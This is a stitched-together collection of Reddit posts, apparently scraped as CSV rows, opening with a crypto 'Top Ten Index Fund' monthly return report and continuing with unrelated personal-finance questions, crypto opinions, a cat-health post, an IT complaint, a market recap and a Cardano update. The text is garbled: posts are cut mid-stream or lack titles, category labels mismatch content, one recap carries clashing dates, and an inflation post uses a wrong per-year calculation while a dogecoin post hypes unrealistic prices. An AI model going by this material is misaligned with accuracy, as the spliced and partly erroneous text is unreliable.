[BitDom since Jan 2020](https://preview.redd.it/tnbjmism45t61.png?width=916&amp;format=png&amp;auto=webp&amp;s=b77814f139e78de2df967246023ab98686829501)

Down **BitDom** goes.  At 58.1%, it is now approaching the 2020 Top Ten Experiment low of 56.8% set [last September](https://toptencryptoindexfund.com/tracking-2020-top-10-cryptocurrencies-month-9/).

If you’re new to crypto, keep an eye on this number: a high **Bitcoin Dominance** signals less of an appetite for altcoins and vice versa. 

## Overall return on $1,000 investment since January 1st, 2020:

[ 2020 Top Ten Portfolio's ROI: the best out of the four Experiments ](https://preview.redd.it/1dxvgouq45t61.png?width=355&amp;format=png&amp;auto=webp&amp;s=250313259b6813b302ba0dcb5eeaa85dbc9772ce)

The initial $1000 investment into the 2020 Top Ten Cryptos is now worth **$6,892**, up +589%. After some time behind the [2019 Top Ten Portfolio](https://toptencryptoindexfund.com/tracking-2019-top-10-cryptocurrencies-month-27), the 2020 Portfolio has regained the lead and is now the best performing of [the four Experiments](https://toptencryptoindexfund.com/). 

Below is a month by month ROI of the 2020 Top Ten Experiment, to give you a sense of perspective and provide an overview as we go along:

[Monthly ROI of the 2020 Top Ten Portfolio](https://preview.redd.it/s60s176x45t61.png?width=517&amp;format=png&amp;auto=webp&amp;s=946f515dd3653456ea38b46f469dbfd3fe9e1100)

By a significant margin, +589% is the highest monthly ROI so far for the 2020 Top Ten.  And nothing but green: it has also not seen a red month yet, although it got close.  The range of monthly ROI for the 2020 Top Ten has been massive:  between a COVID induced low of +7% in [March 2020](https://toptencryptoindexfund.com/tracking-2020-top-10-cryptocurrencies-month-3/) and the new high this month of +589%.

## Combining the 2018, 2019, 2020, and 2021 Top Ten Crypto Portfolios 

So, where do we stand if we combine four years of the Top Ten Crypto Index Fund Experiments?

* [2018 Top Ten Experiment](https://toptencryptoindexfund.com/tracking-2018-top-10-cryptocurrencies-month-39): up +30% (total value $1,300)
* [2019 Top Ten Experiment](https://toptencryptoindexfund.com/tracking-2019-top-10-cryptocurrencies-month-27): up +474% (total value $5,737)
* [2020 Top Ten Experiment](https://toptencryptoindexfund.com/tracking-2020-top-10-cryptocurrencies-month-15): up +589% (total value $6,892)
* [2021 Top Ten Experiment](https://toptencryptoindexfund.com/tracking-2021-top-10-cryptocurrencies-month-3): up +240% (total value $3,399)

Taking the four portfolios together, here’s the bottom bottom bottom *bottom* line: 

**After a $4,000 investment in the 2018, 2019, 2020, and 2021 Top Ten Cryptocurrencies,** the combined portfolios are worth **$17,328** ($1,300 + $5,737 + $6,892 + $3,399).

**That’s up +333%** on the combined portfolios, a record high for the Top Ten Index Fund Experiment project, and up from +86% last month.

Lost in the numbers? Here’s a table to help visualize the progress of the combined portfolios:

[ Combined ROI of all four Top Ten Experiments ](https://preview.redd.it/p5o3su3155t61.png?width=511&amp;format=png&amp;auto=webp&amp;s=cdc1b7168e1a1d2c8ae4b39d701d2a72827ad2a6)

***That’s a +333% gain by buying $1k of the cryptos that happened to be in the Top Ten on January 1st, 2018, 2019, 2020, and 2021.***

## Top Ten Index Approach vs. All-In Approach

But what if I’d gone all in on only one Top Ten crypto for the past four years? While many have come and gone over the life of the experiment, five cryptos have started in Top Ten for all four years: **BTC, ETH, XRP, BCH,** and **LTC.** Let’s take a look:

[If playing by the Experiment rules, all in on ETH would have been your best bet ](https://preview.redd.it/1xzf8pv555t61.png?width=885&amp;format=png&amp;auto=webp&amp;s=ffc3a712279da73ff3bfb90cda28833b92bb0571)

At this point in the Experiments, **ETH** is still the best “if-I-had-a-time-machine” choice.  As of today, $4,000 into Ethereum in $1k chunks on four consecutive New Year’s Days would be worth **$36,081**. That’s up **+802%**.

In second place, going all in on **Bitcoin** with $4,000 USD would have yielded **+680%**, turning the initial investment into **$31,200**.  

**XRP** would have been the worst four year all-in bet, but you’d still be +85%.  Not bad.

And the Top Ten Index Fund approach?  

As you might expect (as indexes are designed to mitigate risk), the **+333%** gains of the Top Ten Index Fund approach fall somewhere in between.  The Top Ten strategy isn’t keeping up with **ETH** or **BTC** but it is outperforming a hypothetical all-in investment in both **XRP, LTC,** and **BCH** by a healthy margin.

So that’s the Top Ten Crypto Index Fund Experiments snapshot. Let’s take a look at how traditional markets are doing.

## Comparison to S&amp;P 500

I’m also tracking the S&amp;P 500 as part of my experiment to have a comparison point to traditional markets. March saw yet another all time high for the S&amp;P.  The S&amp;P has returned +24% since January 1st, 2020.

[ S&amp;P, up +24&amp;#37; in 15 months ](https://preview.redd.it/dhvitqvd55t61.png?width=760&amp;format=png&amp;auto=webp&amp;s=7f434d82a7f2902fb74a527e9839c91a564aa688)

Not bad for a pandemic year, right? This more than doubles the 8% figure that financial planners use for predicted annual market returns.  

Now scroll up for how it compares to crypto, or let me just make it easy for you: over the same time period, the 2020 Top Ten Crypto Portfolio is returning about **+589%**. The initial $1k investment in crypto is now worth about  **$6,892**. 

That same [$1k I put into crypto](https://toptencryptoindexfund.com/tracking-2020-top-ten-month-one/) in January 2020 would be worth $1240 had it been redirected to the S&amp;P 500 instead. 

That’s a $‭5,652 difference on a $1k investment! And it is by far the largest gap in favor of crypto since the 2020 Top Ten Experiment began.

But that’s just 2020. What about in the longer term? What if I invested in the S&amp;P 500 the same way I did during the first four years of the Top Ten Crypto Index Fund Experiments since January 1st, 2018? What I like to call the world’s slowest dollar cost averaging method?  Here are the figures:

* $1000 investment in S&amp;P 500 on January 1st, 2018 = $1500 today
* $1000 investment in S&amp;P 500 on January 1st, 2019 = $1600 today
* $1000 investment in S&amp;P 500 on January 1st, 2020 = $1240 today
* $1000 investment in S&amp;P 500 on January 1st, 2021 = $1070 today

So, taken together, here’s the bottom bottom bottom *bottom* line for a similar approach with the S&amp;P: 

**After four $1,000 investments into an S&amp;P 500 index fund in January 2018, 2019, 2020, and 2021, my portfolio would be worth $5,410** ($1,500 + $1,600 + $1,240 + $1,070)

That is up **+35%**[ since January 2018](https://toptencryptoindexfund.com/tracking-2018-top-ten-month-one/) compared to a **+333%** gain of the combined Top Ten Crypto Experiment Portfolios, a difference of 298% ***in favor of crypto.*** 

You can also compare against five individual coins (**BTC, ETH, XRP, BCH,** and **LTC)** by using the table above if you want.  Spoiler alert: ***even the lowest performing crypto (XRP) is still returning about two and a half times more than the S&amp;P 500 over the same time period***.

To help provide perspective, here’s a quick look at the combined four year ROI for crypto vs. the S&amp;P up to this point.

[ Combined crypto vs. combined S&amp;P: crypto in command](https://preview.redd.it/n02s77lj55t61.png?width=700&amp;format=png&amp;auto=webp&amp;s=1c884150f40ad0b08f64d62510f224ef0fa8a073)

That’s six straight monthly wins and seven out of eight monthly victories for crypto.

## Conclusion:

Another big month for the 2020 Top Ten Crypto Portfolio. With **Bitcoin** **Dominance** decreasing a bit, the next few months should be interesting.  Remember the 2017/2018 cycle: as **BitDom** was decreasing, there was a surge in altcoins, followed by a total crypto crash, followed by a bear market lasting for years.  Will history repeat itself?  Or is it “different this time”?  

For those who have supported the Experiments over the years, thank you.  For those just getting into crypto, I hope these monthly reports can somehow help with perspective as you embark on your crypto adventures.  Buckle up, think long term, don’t invest what you can’t afford to lose, and most importantly, enjoy the ride!

personalfinance,"To refinance, or not to refinance?","Im been looking at refinancing my home, mainly to get a better interest rate but also to get a bit of money back from my down payment, and also to use some of that to finish the house and property up the way that I would like it.

I bought the house 2 years ago at 182k, with a 76k down payment. I had to go through a private lender as I didnt have any credit at the time, so I currently owe 106k at 7% interest. I know I can basically get a lower interest rate anywhere, but Im wondering if it would be a smart move. 

 Id be looking to refinance for around 135k or so, but I find it hard to bring myself to make the call. My current payment is about $670, and its very manageable for my single person income of about 41k/yr net. Im worried my payment will increase dramatically when going through my credit union. All for a lower rate?

I guess my question is, should I be looking to refinance for a bit more and lower interest rate or should I ""double down"" on the smaller loan amount and get it paid off sooner? 

This is my only real debt and it would be incredible to get it paid off. Any advice, tips, etc., are very appreciated.",finance

Going to school will put me an additional $15k in debt.  I have $8k left in previous federal education loans from a failed attempt about a decade ago.  $8k owed on a car that's worth about the same.  $4k in high interest credit card debt down from $8k at the beginning of the year.  No other debt.  

I received an offer letter today from the construction company.  The operations manager job will start at around $50k yearly with a sign-on bonus &amp; quarterly bonuses based on company performance (low interest rates = insanely busy), insurance paid, and 401k matched, 

Should I go more in debt for a career I'm not entirely set on or should I take the management job &amp; pay off my debt?",finance
personalfinance,Coming up on some major life milestones and still behind on retirement and student loan debt. What do we focus on?,"My husband and I are beginning a new chapter after some major milestones. We are closing on our first home purchase and about to have our first baby. After down payment, closing costs and hospital bills it will be wiping out a lot of our reserves leaving us with just $3,000 for an emergency fund after everything is all said and done. We will essentially be starting over. We really want to create financial stability and success for our family and future and are unsure what to focus on first or to just confront everything simultaneously.

There still are some things that we need to financially address that we have put off for a while. At 32 and 33 we have not saved for retirement (just started contributing to our 401ks to get a company match) and I still have 45k student loan debt. My husband also wants to start investing. Our income after all bills and expenses leaves us with 700 to 1500 left over every month depending on how many paychecks we get (6 months out of the years there is at least one extra paycheck).

My student loan is 45k of federal student loans.  It's the only debt we have and will be forgiven in 8 years if only the minimum is paid, however at this point any amount forgiven in 8 years will be taxed as additional income.

I'd like to bring our emergency fund back to 12k.

I would also like to open up Roth IRAs for both my husband and I before we get any older.

 My questions is what should take priority? Should we only focus on beefing up our emergency fund before opening up Roth IRAs? Should I split the excess money into emergency fund, IRAs, sinking funds, and additional student debt payments? Or should I just continue making minimum payments on the student loans when those resume and wait for forgiveness in 8 years?

 And as we have more responsibilities now with home ownership and being parents should we create additional sinking funds/savings for baby and home? Would I do that concurrently with the emergency fund or just make the emergency fund larger and pool all of that money to cover whatever may arise?

Bitcoin,Coinbase's $100B listing is essentially taking away a potential 10% jump in Bitcoin's $1t market cap,"Brian Armstrong really is just taking from the crypto community from today onwards, after the Coinbase IPO.

First of all crypto is supposed to be based on decentralisation and away from government control. Going for a public listing means it is under the mercy of SEC and can just freeze/hand over people's account/coins when a fed warrant shows up. 

More importantly, he is taking away the $100b market cap which should have gone to Bitcoin's $1t market cap, meaning we lost a potential 10% pump on Bitcoin.

Hence CZ's Binance move of tokenising stock trading is far better than Coinbase's securitising the coins/tokens platform based on stock, there is a subtle but very material difference between the two.

personalfinance,Buying a house with big student debt bill?,"I graduated college about 2 years ago now and have around $70k in loans. Thankfully I found a good job after graduating to help pay it down. Since this job required me relocating and I didn't have much in savings, renting an apartment was pretty much my only option as rentable houses in this area were a smidge out of my budget at the time.

In the time since, though, I've received a few pay raises and have been able to save a decent amount even with my high monthly expenses and relatively low salary. I started focusing on saving about a year ago and am on track to have saved around $20k by the end of the year. 

So at the end of last year I ended up renewing my lease on my apartment. When I did this I lost most of my first-year promos which drove my monthly rent to $1100/month. As someone who works in finance and likes to think I'm somewhat financially astute, I can't help but hate seeing over $13k in post-tax dollars going out the window permanently for rent every year.

I certainly don't care to take on more debt, but I really hate to see my money going to nothing each month. I know many people who own small houses with mortgage payments similar to my rent, or even less. 

So I guess my question is, would it be a bad idea to try to buy a house while still paying off student debt? I know it would be bad in terms of my total debt load, but if I'm paying that $1100/month regardless, wouldn't it at least be beneficial if those payments were helping me build equity in a home?

Ideally if I could, I would buy a duplex and try to rent out the other side to help offset the mortgage anyway. Or at the very least rent out a room or two to friends. So I would almost certainly anticipate being out of less than $1100/month which would be much better than my current situation. 

If it matters (I know it does for mortgage interest rates) my credit score currently hovers around 760. So would it be a bad idea to try to go down this road before paying off all of (or a lot of) my student debt bill? Any advice is greatly appreciated",finance

personalfinance,US - Buying Rental from Parents,"I've read a lot of similar threads on this subreddit, but would appreciate any other insight or advice more specific to my situation.

For the last 2 years, my spouse and I have been renting a home owned by my stepmom.  Our financial plan had been to live here for about 5 years, pay down debt, save up a down payment, and then buy a house (with a strong possibility the house we'd be buying is the one we're living in). 

However, due to a combination of factors, stepmom would like to sell us the house now. She is willing to be generous to make it work, which is good because we have no down payment at all at this stage. 

So we're trying to figure out what that looks like from a practical perspective. Here's my plan so far: 

1. We engage the services of a real estate attorney. I suspect after this point things will be a lot clearer, because they'll have experience and expertise!
2. Stepmom names her price. We've talked about some ballpark numbers that are very comfortable for my spouse and I, but we need a ""real number"" to get the money moving. Stepmom has agreed to give us at least a 5% gift of equity. I have some questions on that, specifically. To what extent is ""getting a good deal on the house"" just a good deal vs a gift of equity? For example, Zillow currently estimates this house is worth almost 200k (up 15k since we started talking about this with my stepmom 2 months ago). My stepmom has talked about selling it for closer to 165k, because she feels that's more realistic/fair. Assuming the bank valuation is closer to 200k, is that whole 35k a ""gift of equity""? 
3. We apply for a mortgage. I was looking at FHA loans, but I don't feel like I have a deep well of knowledge here, and welcome advice. (I'm aware of the model of simply paying the ""loan"" to my parents over time with a minimal interest rate, but I don't want to do that, because I don't want a long-term financial commitment to my parents.) This is the piece I'm most nervous about -- getting the loan without a down payment.
4. We get an inspection. I don't anticipate any surprises since we've lived here two years, but I still want to Know. 
5. Closing! The attorney draws up the paperwork and we sign it all and it's done.

Is there any important step I'm overlooking? Is this plan realistic, or is the idea of buying a house with no cash down not actually a possibility?",finance
CryptoCurrency,The goal of crypto was wrong from the start.,"Globally adopted, digital cash.

&amp;#x200B;

This is not happening boys, pack it up.

Seriously though, crypto is shaping out to be something very different from what it set out to be. This doesn't make it less of a world-changing technology though.

Bitcoin failed at being digital money, it turned into digital gold, a store of value, not something you would use to buy your daily coffee.

New projects don't even try to be money anymore, ETH is a decentralized computer that might just take over the whole financial system with defi and dexes, making saving your money at banks with shitty interest rates obsolete.

Hell, even though Monero, started with the sole goal to build untraceable, low fee money, fixing some of BTCs biggest reasons that turned it into digital gold instead of cash, will most likely become the cheaper, digital alternative to off-shore bank accounts while people will, for the most part, keep buying everything from coffee to drugs with either physical or centralized digital cash.

&amp;#x200B;

At this point, while I have little doubt that crypto will become an unbelievably massive industry, i don't think it will replace ""strong"" (lol) like the dollar or euro, quite possibly, ever.

Doesn't matter that crypto might be nearly as important of an invention as the internet, as long as there is at least some trust in the governments, crypto won't replace ""normal"" money at physical locations and by definition, most crypto ""currencies"" won't achieve their original goal.

Back story- a few years ago I got myself a 2012 Chevy Cruze that turned out to be a COMPLETE lemon. I spent over $6000 in the year and a half I had it just on fixing things. I didn’t feel safe and needed to get in something else. I went car shopping alone (not smart as a 20 something female who isn’t educated in car buying, loans, interest rates etc.) Annnyways, I traded that car and got a 2016 Honda Civic on Halloween of 2018. That came with $9000 of negative equity from the devil car (I mean, Chevy Cruze.)

Currently- My payment is $423/month and my loan (which is through Huntington Bank) is a 74 month loan. I pay $500 every month and my total amount left is $15,000. Now I have been able to make this work financially, but no one wants to pay $500/month for a Honda Civic... my interest rate I believe is at 9% (although I can’t find in online anywhere, I’m sure it’s in my paperwork from buying the car.) My credit score is 660. I’ve never missed a payment or anything like that. 

My main question- Is there anything I can do to lower my auto loan amount or lower my interest rate so I can pay this thing off quicker!? Would refinancing be beneficial? Can I negotiate my loan amount or my interest rate with Huntington? If so, what are some pointers?",finance

So I decided to check that by taking products/services that objectively has not chanced from the 60s until now. Below is what I chose and the math behind my inflation equation. 

Colt 1911, 1960 price $66.75, 2021 price $799

[[($799-$66.75)/$66.75]*100%]/61 years= 17.98% inflation per year

7/11 slurpee, 1960 price $0.10, 2021 price $1.39

[[($1.39-$0.10)/$0.10]*100%]/61 years= 21.15% inflation per year

U.S. E1 monthly pay, 1960 price $83.20, 2021 price $1785

[[($1785-$83.20)/$83.20]*100%]/61 years= 33.53% inflation per year

business,IT is Not Taken Seriously by Too Many Businesses,"I am a senior sysadmin and have noticed over in r/sysadmin too often we get entry level IT people who are hired by companies to run their entire IT department by themselves. These people often aren't qualified to work an entry level IT job much less be the sole IT person for a company. They get some young kid, I presume because people think young people come out the womb knowing computers, and they are put into a job doing it all. Plus they can be hired dirt cheap.

We also get tons of ""We have no budget"" stories of some horrible messed up environment. I personally have only worked at one small company and it was run pretty well. The rest of my career has been with large organizations including fortune 100 companies and now currently the Federal Government so I just shake my head in bewilderment at these stories.

So my question is to you folks, is it just an IT problem or do other departments suffer the same problem? Do businesses hire some kid fresh out college to be the sole accountant or engineer? Or is it just that IT isn't respected by the business world?

I get being a small business is tough. I especially get if you are a couple of guys and gals starting out in your garage you need to do it all yourself. I am not talking about that. I mean established business that have been operating for years with several hundred employees (sometimes thousands). I know that is still small business but when you reach that stage don't you usually start formalizing your business processes and hire professional people to do your accounting, HR, marketing etc. Or at least outsource that stuff? Maybe I am in wrong circles but I don't often hear of some young kid with no experience being hired to run the manufacturing plant or the warehouse because he is cheaper.

I also get IT is a cost center so it isn't going to get a lot of love but it is a force multiplier. Try sending your salesman into a sales call with no laptop, phones or email. You aren't going to get far.

Maybe we just get the bottom of the barrel of people trying to get free tech support but would love to hear from some non-IT folks about why IT is the red headed step child of the business world. Thanks",finance

stocks,"Here is a Market Recap for today Wednesday, August 14, 2021","**PsychoMarket Recap - Wednesday, April 14, 2021**

Stocks traded mixed on Wednesday, with the Dow Jones rallying to intraday highs while the S&amp;P 500 (SPY) and tech-heavy Nasdaq (QQQ) pulled back. Market participants digested a slew of corporate earnings reports from big banks in the US and remarks from Federal Reserve Chair Jerome Powell

Earnings kicked off this morning with several banks reporting first-quarter earnings. JPMorgan (JPM), Goldman Sachs (GS) and Wells Fargo (WFC) blew past analyst expectations, driven by lower loan losses, robust trading and investment banking revenue. Expectations for a strong profit rebound have helped financial stocks and the equity markets rally but have also set a high bar for companies to clear. 

Wall Street analysts are expecting a surge in corporate profits in tandem with the recovering economy, with the reopening of the economy and a rise in consumer spending set to boost companies’ results. Ryan Detrick, chief market strategist at LPL Financial said, “We could see upwards of 30% year-over-year earnings growth in the first quarter. That would be the most we’ve seen since coming out of the financial crisis. Expectations are for about 25% earnings growth in the first quarter. And let’s not forget in the previous two quarters what happened: massive, massive beats.”

Jerome Powell reiterated that a near-term move on interest rates remains unlikely until economic recovery, and particularly the labor market, are able to build up momentum and said the Central Bank would slow the pace of its bond purchase program “well before” raising interest rates. Powell said, “We will taper asset purchases when we’ve made substantial further progress toward our goals from last December when we announced that guidance. That would in all likelihood be well before the time we consider raising rates.”

Looking ahead, market participants will closely monitor the report of March retail sales set to be released tomorrow. March retail sales are expected to be strong, with stimulus checks making their way into the economy and the economy gradually reopening due to effective distribution of the vaccine. Economists expect March retail sales to rise a consensus 6.1%, or 5.3% excluding autos, according to Dow Jones. That compares to a sales decline of 3% in February

personalfinance,I gave my employer a 2-week notice last week. They plan to offer me a bonus to stay a month or two longer. What should I do?,"Hi all! Longtime lurker, first time poster.

Some recent restructuring of the company I work for eliminated two positions I was very likely to be promoted to within the next few months. It is a great place to work, in my opinion, but I now view the position as a dead end job for quite a while. I've decided to bet on myself and I gave my 2-week notice last week, citing a lack of opportunity. Today, upper management reached out to me to gauge my interest in staying on a little longer if a bonus were offered. No specific numbers were discussed, just that it would be through approximately the first week of June. I said I am open to at least consider it when they have numbers to present to me.

I do not have another position lined up yet so that would not be a barrier to staying on longer. I'm also in a pretty good position financially as I live frugally. I could be without a job for while and I would be able to get by. The company, meanwhile, needs all the help they can get during this transition period. I am the most knowledgeable of the local market, my location is already short-staffed, and I've been doing the work of 2 people for quite some time. I held on with the promise of a promotion just ahead but now that is all gone.

I don't enjoy the job anymore and I know that they really need me yet. If the price is right, I could stick around a little longer at a place I have become disillusioned with. I'm not sure what a reasonable price would be or how much is up for negotiation. I expect to be presented an offer tomorrow, with the option to sit on it overnight. Has anyone been in a situation like this before?  Should I demand a certain percentage of my pay? What would you do? Any advice is greatly appreciated!

&amp;#x200B;

**TLDR:** Put in 2 weeks. Employer waited a week and now will offer a bonus to stay 1-2 months longer during a crucial time for their business. I'm looking for thoughts and advice on what my demands should be at the discussion table.",finance

personalfinance,Make big down payment or keep the money to pay off loan?,"Looking to buy myself a car. I own 2 cars at the moment, both have been project builds that I’m looking to finally sell. I bought them both for cheap with cash years ago; I’ve never financed something like a car or a house before, so any advice would be greatly appreciated.

I’m looking at a $30,000 car. I would like low monthly payments, so my first thought is to get about $13-15,000 out of my 2 cars and use that as a down payment. I understand that would keep monthly payments low and also net me a better interest rate.

My question is, would it be better to pull 20% of the listing price of the car from that $15,000 for a down payment, and then continue to pull from there as required by my monthly note?

economy,Wouldn't it be better for the economy if credit unions were more common?,"Unlike a bank a credit union is owned by and therefor run for customers. Its profits are distributed to members through cheaper services and better interest rates on loans and deposits, rather than to a small group of major shareholders. Also good service is a primary goal rather than an intermediary one.

So wouldn't it be better for the economy if credit unions were the dominant form of business in the financial service sector? The only argument agianst credit unions I've seen is that big banks currently have more money to invest in technology so they have better apps and more ATMs, but that's just a problem of scale, not a problem with the business model.

The same argument would also apply to other consumer-owned enterprises in a few crucial sectors. If a majority or even all credit companies, insurance companies, energy companies, grocery stores etc. were (mostly) owned by their customers, wouldn't this significantly cheapen financing costs for people and companies and lower overall cost of living?

Shouldn't governments adopt policy to make the kinds of consumer cooperatives more prevalent to strengthen the economy?",finance

personalfinance,"24 years old, don’t know if I should save for down payment or invest more","Hi all,

I’m a 24 year old and make 62k a year. I’m a huge boggle head and have a Roth IRA that I max out and put up to the match on my Roth 401k and have about 40k total in retirement savings between the two. Everything is in total market index funds with a 70/30 split US/international. I have an emergency fund of 5k and add about 1100 a month to it every month. For 6 months of expenses I want to get it to about 10-15k which I think I can do by the end of this year or so if I throw my bonus in there.

This question in more for after that happens. I don’t know if I should put more money into my 401k up to the limit or save for a down payment on a house. Housing in the US right now is RIDICULOUS. It simply doesn’t make sense, I make a decent income and can save about 1/3 of my income after taxes strictly for a down payment but with the housing market like it is it appears that housing prices will climb even faster than I can save money for a down payment. From all the research I have done I think perhaps in 2-3 years interest rates will rise and the market may cool down as raw materials (especially lumber) recover from Covid constrictions on their supply chains. But on the other hand this could be the norm. In other countries like Australia and other in Europe they have extremely expensive housing costs and getting a starter home is insanely pricey.

I don’t think I would buy a house for a 2-3 year period at the very least anyway, realistically I’d buy something perhaps in 4-5 years but during that time should I prioritize saving for a down payment or allocate a little more money to my 401k? It’s impossible to know for sure what will happen but the general real estate market has young people (even extreme savers like me) feeling hopeless on being able to find a modest starter home. It’s sad to say (pretty selfish in a lot of ways honestly, and I know the old saying careful what you wish for) but I know SO many people in my age demographic that would love to see the real estate market crash just so they can afford a modest house. I’m stuck and confused as to what I should do and how to best be productive with my money.",finance

personalfinance,Am I in over my head spending $3300 on a mortgage?,"Looking for advice as I've never been involved with this much money in my life. To give some important data points, I'm getting married soon and buying a house in Chicago with my fiance. The house will be around $3300/mo for 30 years. A large portion of my income is based on bonus, so on a bad year, we'd be at a combined pre-tax total income of $160k. On a good year, that number is around $215k.

I have about $15k debt (car loan with 1% interest rate) and my fiance has about $40k in student loan debt (about 3% interest rate).

Is $3300 too much for a mortgage? We really like the neighborhood we're looking in, but unfortunately it's extremely expensive for a home bug enough to start a family in.

**Edit:** I should have clarified, the $3300 number includes all HOA fees and taxes.

**Edit 2, Electric Boogaloo:** I will be paying about 800/mo for the next 20 months on the car. My partner pays about $400/mo for the next 8 years for her student loans I think... Will have to follow up with her on that one.",finance
personalfinance,Is it possible to withold 0 federal tax throughout the year from your paycheck? Is this legal?,"So in 2020 my Credits eliminated my tax bill, and I was returned all of my witholdings that my employer held from my paycheck in 2020. Well, that got me thinking, if I crunch some numbers and ensure that I will be getting my witholdings back from this year as well, why should I withold anything?  


Wouldn't it make more sense to use those witholdings that I lend the government for a year and dump them into some investments.. Or better yet, increase my 401k or traditional ROTH to further reduce my taxable income?

I would obviously make sure that my credits are going to eliminate my tax bill, but even if I calculate something wrong, I can just pay what I owe with some money I have saved. Or I could liquidate some long term capital gains if I don't have enough liquidated assets (I'm sure that I will have enough thought)

What is everyone's thoughts on this strategy? Is it legal to defer witholdings and just file your taxes at the end of the year? I feel like having my witholdings up front makes more sense. Or increase my retirement accounts with the money that typically would have been witheld to further reduce my taxable income without noticing any loss of income into my household.",finance

dogecoin,Does this mean $100 is possible?,"I mean the elitist crypto nerds from r/cryptocurrency said it'll hit 20 cents by 2025, yet here we are about to reach it. This means that we shouldn't take anything that crypto nerds say seriously, because we will be the ones who have the last laugh. They are most likely jealous. Muh market cap. 


Anyway with the recent surge recently, $1 has now been closer than ever, and I really do think that it's possible despite muh market cap.


Furthermore I do believe that the hype generated from doge hitting $1 will increase it even more, affecting millions of more people with the FOMO disease. I used to think that no one would buy dogecoin for an absurdly high price such as $1, but I realise that with FOMO, there will most certainly will be buyers, increasing it to $5. Then it repeats from there until it hits $10, then $100, and maybe even beyond that.  

I'll keep on spamming rocket emojis and I'll let you know how it goes. I love you guys so much. Don't ever feel like it's too late to join. Remember that anything under $1 is a dip. Buy some doge and just forget about it for a couple of years. Treat it like an off-hand savings account with a better interest rate.


(Please don't actually spend your life savings on doge, just buy what you're willing to lose)


So my question is, logically speaking wouldn't that mean $100 is possible within the coming years? Of course $100 is possible in the year 2085, but I'm talking about the possibility of $100 within the coming years, maybe 3 years or so.

Tried the income based repayment plan a few times when I was making steady income and wanted to try and make progress paying them down. But since the interest rates were created to completely screw us all over... *huge sigh*... of course I didn’t make much progress. 

I’ve also looked into a few of those student loan consolidation programs where after a certain amount of time the remaining balance is forgiven or whatever, but you have to pay a few hundred dollars for them to do the “paperwork” for you etc. so I’ve never actually taken advantage of any of them because I thought they were a scam.

vet,Concerned about my 4 month old ragdoll having soft stool and bad gas,"My boyfriend and I have two cats. One cat is four years old and we decided to get a ragdoll cat from a breeder that my SO knows personally. When the cats were ready to eat dry food, this breeder gave the cats purina pro plan kitten chicken and rice formula. When we got our kitten, we continued to feed him that food and he was doing fine. We just filled up his bowl and let him regulate how much food he needed. 

My SO did this with his other cat and never had any problems with her in regards to digestive problems. This issue came out the blue. It started as soft stool, then progressed to diarrhea (more liquidly, sorry for TMI). It seems to have started out of the blue and we can’t really pinpoint a cause. From time to time he also has really bad, stinky gas. I know gas is normal for everyone but I have a cat from my childhood that never had any issues like this.

The only possible cause I can think of is that there was one day where our kitten ate all of the older cat’s food, which is the purina one tender selects blend with salmon. I did some googling around and it seems that a kitten eating adult cat food wouldn’t necessarily cause diarrhea, but who knows.

The soft stool-diarrhea has been going on and off for at least three weeks, and we did see the vet about this. They took a stool sample and the results came back normal. No parasites, worms, or anything strange. They said his gut might be a little off so gave us a probiotic called purina fortiflora to sprinkle in his food. 

They also gave us a food sample of purina vet’s diet EN gastroenteric. So we are currently giving him that food with the probiotic mixed in. The first day or so nothing changed, and then on day 3 his poop hardened up. It stayed like that for a couple of days and then it went back to diarrhea. I’m honestly confused and really concerned about him. He doesn’t act any different or appear to be in distress. He’s pretty energetic, sweet and acts like he always does. 

I want to give it another week and if nothing changes, we’re definitely going back to the vet. I’m not a fan of giving him the purina food with grains in it (or grains in cat food generally) but my SO wants to stick with it until the kitten is fully grown so we don’t confuse him with changing up his food so much. 

Going back to my childhood cat, he had problems with food that had grain in it and gained lots of weight, and has been on grain free food ever since. He definitely looks a lot healthier than when we fed him food that had grains in it. However, what might work for one specific cat may not work for the other I feel. 

I don’t really know what to think about grains vs grain free food because some say grains in cat food are cheap fillers in low quality foods, but others say that they provide a lot of nutrients.

I’m honestly not sure what to do to make my kitten feel better. Does anyone have any insights to this? I apologize for the long post, I’m just worried about my furry friend 😭",cryptocurrency
personalfinance,I've had enough of my debt and poor finances and I need some advice.,"Title says it all, I'll try my best to keep this short and sweet but no guarantee. I am bringing in $3200/mo after taxes. Current debts are as listed.

&amp;#x200B;

Financed Dirtbike : $3900 @ 2.99% (with current payments of $270 this will be paid off by Aug 2022)

Debt Consolidation : $12,500 @ 10.03% (current payments of $360 this will be paid off by May 2025)

Credit Card : $3400 (honestly not sure what the interest rate is on it, which makes me feel silly for not knowing)

&amp;#x200B;

Monthly bills including rent, and debt consolidation payment are roughly $1900 combined. This does NOT include groceries, credit card payment, wants or gas... although I no longer have a useable car as of today as it bit the dust and is honestly part of the reason I am making this post. 

&amp;#x200B;

This makes me incredibly embarrassed and sad to say, but I only have $75 in savings and $7500 in a RSP. 

&amp;#x200B;

I feel stuck to say the least. I have had debt that continues to grow since I was probably 18 (I am 25 now) due to silly spending habits, getting my Privates Pilot License, taking ""do what makes you happy"" too literally even though I couldn't afford it, and honestly never really being taught anything about finances other than you need to make money to get things. I've managed to make ALL of my payments on time as I've had steady work for quite some time and I have a good credit score, but I do truly want to get this debt behind me and not feel like I have a dark cloud floating above me at all times.

&amp;#x200B;

My S/O is firm with suggesting that I sell my dirtbike, but in my defense it is really the only hobby I have and it is a hobby that truly brings me joy, keeps me in shape both physically and mentally and is a great stress reliever. I would like to cut my unnecessary spending and maximize debt payment as much as I can in other areas before deciding to sell my dirtbike. If I have to I will but I want to do any and everything I can in my power before I do that. Upon taking a closer look at my spending, A LOT of it is dining out, grocery shopping with no real plan, and liquor. I previously vaped which of course drains the money away, and that is one of the first things I decided to quit as it's not only terrible for my health but my wallet as well. I just cancelled my Netflix subscription and will cancel my car insurance as the vehicle is going to need a repair (fuel pump) that I simply will not be able to afford.

&amp;#x200B;

Anyway... I wanted to make a post to see what others would do if they were in my shoes and get any advice I could. Like I said this debt has been with me for far too long and I want to eliminate it sooner rather than later. Thanks everyone.",finance

10. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
11. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
